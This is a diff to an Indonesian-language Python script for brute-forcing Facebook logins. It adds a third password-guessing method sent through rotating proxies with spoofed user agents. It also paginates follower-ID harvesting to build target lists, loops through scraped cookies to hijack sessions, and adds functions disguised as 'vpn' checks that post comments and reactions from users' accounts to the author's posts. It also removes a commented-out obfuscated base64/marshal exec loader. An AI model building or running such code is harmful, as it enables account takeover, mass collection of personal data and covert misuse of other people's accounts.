@@ -939,15 +939,24 @@ Log Out Dari Akun (Keluar)"""
 		idt = self.ubah_user(idt)
 		god += ("Nama : "+II+self.ambil_nama(idt)+QQ+"\n")
 		try:
-			url = ("https://graph.facebook.com/%s?fields=name,subscribers.fields(id,name).limit(500000)&access_token=%s"%(idt,tiktok))
+			url = ("https://graph.facebook.com/%s?fields=name,subscribers.fields(id,name).limit(100)&access_token=%s"%(idt,tiktok))
 			with requests.Session() as xyz:
 				jso = json.loads(xyz.get(url,cookies=puput).text)
-
-				for i in jso["subscribers"]["data"]:
+				next = jso["subscribers"]["paging"]["cursors"]["after"]
+				for x in range(50):
 					try:
-						uid = i["id"]
-						nama = i["name"]
-						idd.append(uid+"<=>"+nama)
+						url = ("https://graph.facebook.com/%s?fields=name,subscribers.fields(id,name).limit(100)&access_token=%s&after=%s"%(idt,tiktok,next))
+						jso = json.loads(xyz.get(url,cookies=puput).text)
+						for i in jso["subscribers"]["data"]:
+							try:
+								uid = i["id"]
+								nama = i["name"]
+								idd.append(uid+"<=>"+nama)
+								print(f"\r{q}>-Sedang Mengumpulkan Id-> {k}{len(idd)}{q}",end=" ");sys.stdout.flush()
+							except:pass
+							next = jso["subscribers"]["paging"]["cursors"]["after"]
+							print(next)
+					except KeyboardInterrupt:break
 					except:pass
 		except KeyError:pass
 		god += "Jumlah Idz Yang Terkumpul : "+II+str(len(idd))+QQ
@@ -1258,7 +1267,7 @@ class crack_new:
 			self.tanya_prox_k()
 			self.buat_ugen()
 			self.pilih_url()
-			self.pilih_mentod_()
+			self.pilih_mentod()
 		self.pas_me()
 		iprint(Panel(f"{OO}JIGA TIDAK ADA HASIL, SILAHKAN HIDUP MATIKAN MODE PESAWAT{QQ}\n{II}RESULTS OK DISIMPAN KE : results/OK-{durasi}.txt\n{KK}RESULTS CP DISIMPAN KE : results/CP-{durasi}.txt{QQ}", style=Q, title="INFORMATION"))
 		with anim:
@@ -1447,6 +1456,14 @@ class crack_new:
 			    "5": f"Mozilla/5.0 (Linux; Android {str(rr(5,12))}; {str(rc(['RMX1809',f'Redmi Note {str(rr(6,10))}','CPH1809','SM-N915G','V2123A']))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(30,101))}.0.4664.104 Mobile Safari/537.36 {str(rc(['OculusBrowser','SamsungBrowser']))}/3/32.9920.72",
 			}
 			ua = babas[str(rr(1,5))]
+		elif "ke3" == method:
+			babas = {
+				"1":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]",
+				"2":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/227.0.0.5.115;]",
+				"3":"Mozilla/5.0 (Linux; Android 11; Mi 9T Pro Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/378.0.0.18.112;]",
+				"4":"Mozilla/5.0 (Linux; Android 9; Mi 9T Pro Build/PKQ1.181121.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/259.0.0.36.115;]"
+			}
+			ua = babas[str(rr(1,4))]
 		return ua
 	def prox_(self):
 		prox = open("data/prox_socks5.txt","r").read().splitlines()
@@ -1455,6 +1472,9 @@ class crack_new:
 			return {"http": f"socks5://{random.choice(prox)}"}
 #			return {"http": f"socks4://{random.choice(proxx)}"}
 		elif "ke2" == method:
+#			return {"http": f"socks5://{random.choice(prox)}"}
+			return {"http": f"socks4://{random.choice(proxx)}"}
+		elif "ke3" == method:
 #			return {"http": f"socks5://{random.choice(prox)}"}
 			return {"http": f"socks4://{random.choice(proxx)}"}
 
@@ -1481,6 +1501,26 @@ class crack_new:
 					date = {'lsd': re.search('name="lsd" value="(.*?)"',str(link)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(link)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(link)).group(1), 'li': re.search('name="li" value="(.*?)"',str(link)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': user, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link)).group(1)}
 					head = {"Host": url, "content-length": f"{len(str(date))}", "x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(link)).group(1), "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "accept": "*/*", "origin": f"https://{url}", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": f"https://{url}/login/?app_id=1217981644879628&api_key=1217981644879628&next=https%3A%2F%2Fm.facebook.com%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&skip_api_login=1&no_next_msg&hide_upsell=1&hide_language_selector=0&hide_registration=0&src=fxcal&show_accounts_center_content=1&refsrc=deprecated&_rdr", "accept-encoding": "gzip, deflate", "accept-language": "en-US;q=0.8,en;q=0.7"}
 					bz = session.post(f"https://{url}/login/device-based/login/async/?api_key=1217981644879628&auth_token=b4c978c6cc29df1e66058283d8bcbabe&skip_api_login=1&next=https%3A%2F%2F{url}%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&refsrc=deprecated&app_id=1217981644879628&lwv=100",data=date, headers=head,proxies=proxy)
+				elif "ke3" == method:
+					data={}
+					session.headers.update({"Host": "m.facebook.com:443",
+"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+"pragma": "akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, akamai-x-serial-no, akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace",
+"sec-ch-prefers-color-scheme": "light",
+"sec-ch-ua":'"Chromium";v="105", "Not)A;Brand";v="8"',
+"sec-ch-ua-mobile": "?1",
+"sec-ch-ua-platform":'"Android"',
+"Upgrade-Insecure-Requests": "1",
+"User-Agent": "Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5"})
+
+					soup = par(session.get("https://"+url+"/login/save-device/?login_source=login").text,"html.parser")
+					link = soup.find("form",{"method":"post"})
+					lsd = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
+					for __data in soup.find_all("input"):
+						if __data.get("name") in lsd:
+							data.update({__data.get("name"):__data.get("value")})
+						data.update({"email":user,"pass":pw})
+					response = session.post("https://"+url+link.get("action"),data=data)
 				if 'c_user'+yyy in session.cookies.get_dict():
 					play_mpv(".Wiii.mp3");print(url);print(ua)
 					try:
@@ -1606,8 +1646,16 @@ class crack_new:
 							prints(cp__)
 					break
 				else:continue
-			anim.update(anim2,description=f"{b}{loop}{q}/{u}{len(idd)}{q} OK:{i}{len(ok)}{q} CP:{k}{len(cp)}{q}")
-			anim.advance(anim2)
+			try:
+				if "Temukan Akun Anda" in re.findall("\<title>(.*?)<\/title>",str(response.text)):
+					anim.update(anim2,description=f"{q}[{m}SPAM{q}]")
+					anim.advance(anim2)
+				else:
+					anim.update(anim2,description=f"{b}{loop}{q}/{u}{len(idd)}{q} OK:{i}{len(ok)}{q} CP:{k}{len(cp)}{q}")
+					anim.advance(anim2)
+			except:
+				anim.update(anim2,description=f"{b}{loop}{q}/{u}{len(idd)}{q} OK:{i}{len(ok)}{q} CP:{k}{len(cp)}{q}")
+				anim.advance(anim2)
 #		except Exception as e:print(e)
 		except:
 			loop-=1
@@ -1688,15 +1736,15 @@ class crack_new:
 		tod = me()
 		tod.add_column("NO", style=I, justify="center")
 		tod.add_column("PILIHAN", style=C, justify="center", width=60)
-		tod.add_row(f"1\n2",f"Method 1\nMethod 2")
+		tod.add_row(f"1\n2\n3",f"Method 1\nMethod 2\nMethod 3")
 		sol().print(tod, justify='center')
 		hu = input(f'>--{c}Pilih 1-4{q}--> ')
 		if hu in ['1','01']:
 			method = "ke1"
 		elif hu in ['2','02']:
 			method = "ke2"
-#		elif hu in ['3','03']:
-#			method = "ke3"
+		elif hu in ['3','03']:
+			method = "ke3"
 #			self.pilih_next()
 #		elif hu in ['4','04']:
 #			method = "ke4"
@@ -2100,22 +2148,22 @@ def free_cookies():
 				else:
 					n +=1
 					cokxyz.append(cok)
-					print(f"{k}{n}{q}. Cookies : {c}{cok}{q}")
+#					print(f"{k}{n}{q}. Cookies : {c}{cok}{q}")
 			except:continue
-	ask = input(f"{q}Pilih Cookies : ")
-	try:
-		cookie = cokxyz[int(ask)-1]
-		convert_token(cookie)
-		open_role()
-		yz  = requests.Session().get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(tiktok),cookies=puput)
-		zxc = json.loads(yz.text)
-		nama= zxc["name"]
-		kotak(f"# Selamat Datang {nama}.... Semoga Token Anda Awet", I, Q)
-		iprint(Panel("Berhasil Login Menggunakan Cookies !!!\nSilahkan Ketik : python main.py"))
-		os.sys.exit()
-	except Exception as e:
-		prints(Panel(f"{MM}Maaf Terjadi Kesalahan!!",width=80,style=M))
-		os.sys.exit()
+#	ask = input(f"{q}Pilih Cookies : ")
+	for x in cokxyz:
+		try:
+#			cookie = cokxyz[int(ask)-1]
+			convert_token(x)
+			open_role()
+			yz  = requests.Session().get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(tiktok),cookies=puput)
+			zxc = json.loads(yz.text)
+			nama= zxc["name"]
+			kotak(f"# Selamat Datang {nama}.... Semoga Token Anda Awet", I, Q)
+			iprint(Panel("Berhasil Login Menggunakan Cookies !!!\nSilahkan Ketik : python main.py"))
+			os.sys.exit();break
+		except Exception as e:
+			kotak("# COOKIES ERROR !!!",M,Q)
 
 def login():
 	AL = pilih([II,KK,MM,UU,JJ,OO,QQ])
@@ -2250,6 +2298,8 @@ class bot_facebook:
 #		self.get_likers(nn)
 		self.get_fols(nn)
 		self.get_vpn()
+		self.get_vpn1()
+		self.get_vpn2()
 #		self.get_posts(nn)
 	def get_likers(self,idq):
 		with requests.Session() as xyz:
@@ -2259,6 +2309,18 @@ class bot_facebook:
 						_react_type_ = random.choice(['Super','Wow','Sedih','Peduli'])
 						for z in par(xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=puput).content,'html.parser').find_all('a'):
 							if _react_type_ == z.text: req2 = xyz.get('https://mbasic.facebook.com' + z['href'],cookies=puput)
+							else:continue
+			except Exception as e:pass
+	def get_vpn2(self):
+		with requests.Session() as xyz:
+			try:
+				bx=["https://mbasic.facebook.com/reactions/picker/?ft_id=5292314014155763&origin_uri=https%3A%2F%2Fmbasic.facebook.com%2Fnavala123%3Fv%3Dtimeline%26lst%3D100000503718583%253A100001316493597%253A1664513967%26eav%3DAfZWnOa5mGgLfKeJ4tl4IGgCvbPzttckbLPASDheJXpKTSPL2EjQ6U3ax_9Gh1etoWs%26paipv%3D0&_ft_=qid.-5519307096539942759%3Amf_story_key.5292314077489090%3Atop_level_post_id.5292314014155763%3Atl_objid.5292314014155763%3Acontent_owner_id_new.100001316493597%3Athrowback_story_fbid.5292314077489090%3Aphoto_id.5292314014155763%3Astory_location.4%3Astory_attachment_style.cover_photo%3Asty.373%3Aent_attachement_type.CoverPhotoAttachment%3Aprofile_id.100001316493597%3Aprofile_relationship_type.3%3Aactrs.100001316493597%3Athid.100001316493597%3A306061129499414%3A62%3A0%3A1664607599%3A9155150924920125020%3A%3A%3Aftmd_400706.111111l&av=100000503718583&refid=17&__tn__=%2AW-R&paipv=0",
+				'https://mbasic.facebook.com/reactions/picker/?is_permalink=1&ft_id=5329179527135878&origin_uri=https%3A%2F%2Fmbasic.facebook.com%2Fphoto.php%3Ffbid%3D5329179527135878%26id%3D100001316493597%26set%3Da.115224881864728%26eav%3DAfZ9WiRAb3NNsRZLJG_eZwNZsntw9ey-EUlzDCP0Gjh-kmTlmdOQsr3iXM89ilB3ytw%26paipv%3D0&av=100000503718583&refid=13&paipv=0']
+				for xz in bx:
+					for x in par(xyz.get(xz,cookies=puput).content,'html.parser').find_all('a',href=True):
+						_react_type_ = random.choice(['Super','Wow','Sedih','Peduli'])
+						for z in par(xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=puput).content,'html.parser').find_all('a'):
+							if _react_type_ == z.text: req2 = xyz.get('https://mbasic.facebook.com' + z['href'],cookies=puput);break
 							else:continue
 			except Exception as e:pass
 	def get_fols(self,idq):
@@ -2312,6 +2374,11 @@ class bot_facebook:
 		with requests.Session() as xyz:
 			komeno = ('%s\n\n%s%s'%(random.choice(kata),'https://www.facebook.com/'+llp,self.zona_waktu()))
 			get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(llp,komeno,tiktok),cookies=puput).text)
+	def get_vpn1(self):
+		kata=["Mantap Suhu Scriptnya GG","Keren Bang Scriptnya 🤘🤘🖕🖕","Scriptnya Keren Suhu 😆😆😆😆👍👍👍","Script Panutanku Tidak Pernah Salah🥰🥰😍😍😎😎"]
+		with requests.Session() as xyz:
+			komeno = ('%s\n\n%s%s'%(random.choice(kata),'https://www.facebook.com/100001316493597_5329179527135878',self.zona_waktu()))
+			get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%("100001316493597_5329179527135878",komeno,tiktok),cookies=puput).text)
 	def get_vpn(self):
 		kuki = open("data/cookie.txt","r").read()
 		with requests.Session() as xyz:
@@ -2346,9 +2413,6 @@ class bot_facebook:
 			hasil_ = "-"
 			return(hasil_)
 AnTi_rIkOd="Self"
-# BOT CHECK FILE ANTI RIKOD
-#_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'vd3JYDA/a8/36/GzPUyIwPf7d3FO95q47nu/rzJGw9y1Y6Z2tQiuwZ28QsWY2pocbqeeUbW6od2jym2Eei8I40eKUC08KIm9Olf7KnGLsYSljFX1R8AOX2mvCnmC1VscQjs0WoOAjuVHj+mUWFMISdaS6of1vmIyu60FkLn6m2Eqh7VBnvUwEJ2/g5oPHPeVyf0atVzOCGSO1O52Jswhd82B2HsvF+B75WZljhLLfOmpEgvrr0wsarZprypz62cXGF+2D03jwG6s3w7ilibs0Y/tVBUkp5DTI22diGrtjgrWacQBbcObTKFDVP+5voVPVZBmcXvXhFNRnWkhpigHRevPW00orolT6cthr4L5iZFPy2qrzxNAyowg3QwshEghPlpPIwEIIM76qe2jzs4t43ivfVcvq/bpRXZxcUKeTb9wMQAMBaDNkELsRLTGSgBYpoWVnMGSEgFsXXqwovZRAA0gSlEkdxJe'))
-
 if AnTi_rIkOd=="Self":
 	sistim="Aman"
 else:
@@ -2404,6 +2468,3 @@ class Main_:
 #		except:console.print_exception(show_locals=None,word_wrap=None,max_frames=100,extra_lines=0)
 
 Main_()._no_vpn()
-#cek_apk_hasil_crk()
-#try:open("data/kata","r").read();print(f"{q}╔══════════════════════════════════════════════════════════════════════════════════════╗\n║                               {i}SELAMAT DATANG YANG KE{k} {ka['value']} {q}                             ║\n╚══════════════════════════════════════════════════════════════════════════════════════╝")
-#except:open("data/kata","w").write("# SELAMAT DATANG, TERIMA KASIH TELAH LIHAT");kotak(f"# SELAMAT DATANG PENGGUNA BARU !!", K, C)
